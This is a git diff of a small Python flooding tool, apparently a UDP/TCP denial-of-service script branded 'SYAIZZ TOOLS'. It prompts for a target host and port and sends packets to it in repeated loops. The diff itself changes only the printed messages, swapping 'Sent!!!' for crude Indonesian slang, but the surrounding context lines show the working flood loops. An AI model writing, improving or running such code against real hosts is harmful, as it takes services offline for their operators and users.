@@ -2,7 +2,7 @@ import random
 import socket
 import threading
 
-print("kontol")
+print("SYAIZZ TOOLS")
 ip = str(input(" Host/Ip:"))
 port = int(input(" Port:"))
 choice = str(input(" UDP(y/n):"))
@@ -17,7 +17,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Sent!!!")
+			print(i +" Noh paket anjg")
 		except:
 			print("[!] Error!!!")
 
@@ -30,7 +30,7 @@ def run2():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" Sent!!!")
+			print(i +" Noh paket anjg")
 		except:
 			print("[!] Error!!!")
 
@@ -44,7 +44,7 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Sent!!!")
+			print(i +" Noh paket anjg")
 		except:
 			s.close()
 			print("[*] Error")
